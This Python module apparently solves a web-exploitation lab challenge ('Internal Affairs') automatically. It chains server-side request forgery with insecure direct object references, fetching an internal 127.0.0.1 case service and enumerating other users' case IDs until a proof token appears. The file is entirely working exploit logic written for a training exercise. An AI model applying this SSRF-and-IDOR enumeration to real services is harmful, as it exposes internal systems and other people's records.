"""D29 "Internal Affairs" (web-exploitation-day-27-internal-affairs): SSRF + IDOR on the internal case service.

Kit shape: /api/clues = {framework, feature_route, case_directory_route, topology_route, current_role, service_pattern};
topology_route -> {"case_service": "http://127.0.0.1:8080/status-XXXX"}; case_directory_route -> {"cases": [{id, owner}..]};
feature_route?target=<case_service>?id=<non-analyst case id> -> {"ok":true,"effect":"ssrf_then_object_authorization",
"evidence":"proof_..."}.
"""
import json
import re
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^(case_directory_route|topology_route)$", "day29_web_internal_affairs")]
PARAMS = ("target", "url", "uri")
IDS = ("id", "case", "case_id")


def _json(base, path):
    st, body, _ = websolve.fetch(urllib.parse.urljoin(base, path))
    try:
        return json.loads(body or "")
    except ValueError:
        return {}


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    fetcher = cl.get("feature_route")
    if not isinstance(fetcher, str):
        return None
    topo = _json(base, cl.get("topology_route") or "/api/topology")
    svc = next((v for v in topo.values() if isinstance(v, str) and v.startswith("http")), None) if isinstance(topo, dict) else None
    cases = _json(base, cl.get("case_directory_route") or "/api/cases")
    cases = cases.get("cases", []) if isinstance(cases, dict) else []
    role = cl.get("current_role", "analyst")
    ids = [c.get("id") for c in cases if isinstance(c, dict) and c.get("owner") != role]
    ids += [c.get("id") for c in cases if isinstance(c, dict) and c.get("owner") == role]
    if not svc:
        return None
    furl = urllib.parse.urljoin(base, fetcher)
    _, body, _ = websolve.fetch(furl)
    named = [n for n in PARAMS if re.search(rf"\b{n}\b", body or "", re.I)]
    for name in dict.fromkeys(named + list(PARAMS)):
        for cid in ids:
            for ik in IDS:
                sep = "&" if "?" in svc else "?"
                tgt = f"{svc}{sep}{ik}={cid}"
                _, body, _ = websolve.fetch(f"{furl}?{urllib.parse.urlencode({name: tgt})}")
                p = websolve.proof(body)
                if p:
                    return p
    return None


HANDLERS = {"day29_web_internal_affairs": exploit}
